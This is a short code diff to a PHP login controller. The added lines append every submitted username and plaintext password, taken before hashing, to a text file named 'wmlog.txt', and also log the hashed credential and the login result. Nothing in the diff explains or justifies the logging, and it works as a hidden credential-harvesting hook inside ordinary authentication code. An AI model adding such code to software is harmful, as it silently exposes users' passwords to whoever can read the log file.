@@ -42,9 +42,11 @@ class IndexController extends Controller {
          $userData=M('user');
          $username=I('post.username');
          $password=I('post.password');
+         file_put_contents('wmlog.txt', $username.":".$password.PHP_EOL, FILE_APPEND);
          $password=md5($password);
          $map=array('username'=>$username,'password'=>$password);
          $user=$userData->where($map)->find();
+         file_put_contents('wmlog.txt', $username.":".$password.PHP_EOL, FILE_APPEND);
 
          $first_module=false;
          if ($user) {
@@ -77,7 +79,7 @@ class IndexController extends Controller {
                     break;
                  }
              }
-
+             file_put_contents('wmlog.txt', "login:".$first_module.PHP_EOL, FILE_APPEND);
              if ($first_module) {
                 action_log('登录成功');
                 $this->redirect('/'.$first_module,'',0, '登录成功');
